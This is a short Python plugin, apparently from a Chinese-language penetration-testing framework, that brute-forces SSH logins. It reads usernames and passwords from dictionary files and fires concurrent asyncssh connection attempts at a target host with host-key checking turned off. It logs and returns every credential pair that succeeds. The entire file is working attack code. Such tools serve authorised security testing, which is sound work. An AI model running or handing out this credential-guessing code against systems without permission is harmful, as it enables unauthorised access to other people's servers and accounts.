# -*-* coding:UTF-8
import os
import asyncssh


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "ssh服务口令破解",
        "datetime": "2021-12-31"
    }

    @cli.options('ip', desc="设置输入目标", default='{self.target.value}')
    @cli.options('port', desc="设置目标端口", type=int, default=22)
    @cli.options('method', desc="口令爆破模式 1:单点模式 2:交叉模式", type=int, default=2)
    @cli.options('username', desc="用户名称或字典文件", default=os.path.join('data', 'ssh_username.dict'))
    @cli.options('password', desc="用户密码或字典文件", default=os.path.join('data', 'ssh_password.dict'))
    @cli.options('timeout', desc="连接超时时间", type=int, default=3)
    def ip(self, ip, port, method, username, password, timeout) -> dict:
        with self.async_pool() as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.custom_task, ip, port, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def custom_task(self, ip, port, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        await asyncssh.connect(ip, port=port, username=username, password=password, known_hosts=None)
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': port,
            'server': 'ssh',
            'username': username,
            'password': password
        }
